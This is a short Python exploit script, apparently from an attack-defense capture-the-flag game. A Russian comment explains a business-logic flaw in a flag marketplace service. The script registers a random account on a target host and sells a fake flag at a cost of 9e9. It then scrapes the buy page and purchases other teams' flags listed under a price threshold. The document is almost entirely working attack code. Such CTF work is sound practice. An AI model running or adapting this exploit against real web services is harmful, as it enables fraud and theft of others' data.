#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Можно указать стоимость флага 1e9, продать свой флаг, а потом купить флаг Каппы 

import sys
import requests
import re
import string
import random

IP = sys.argv[1]
PORT = 3377

def id_generator(size=8, chars= string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def register(s, URL, login, password):
    data = {"username":login,"password":password}
    r = s.post(URL+"/signup/",data=data)

def auth(s, URL, login, password):
    data = {"username":login,"password":password}
    r = s.post(URL+"/login/",data=data)

def sell(s, URL, fake_flag):
    data = {"flag":fake_flag,"team":1,"cost":"9e9"}
    r = s.post(URL+"/sell/",data=data)

def buy(s, URL):
    r = s.get(URL+"/buy/")
    flagId = re.findall(r"<td>(\d+)<\/td>",r.text)
    price = re.findall(r"<td>\$(\d+)<\/td>",r.text)
    dictionary = dict(zip(flagId, price))
    for i in dictionary:
        if int(dictionary[i]) < 1000000:
            r = s.get(URL+"/buyflag/{}".format(i))
            print(r.text, flush=True)

s = requests.Session()
URL = "http://{ip}:{port}".format(ip=IP,port=PORT)

login = id_generator(4) + '-' + id_generator(4) + '-' +id_generator(4)
password = id_generator(16)
fake_flag = id_generator(31).upper()+"="

register(s, URL, login, password)
auth(s,URL,login,password)
sell(s,URL,fake_flag)
buy(s,URL)
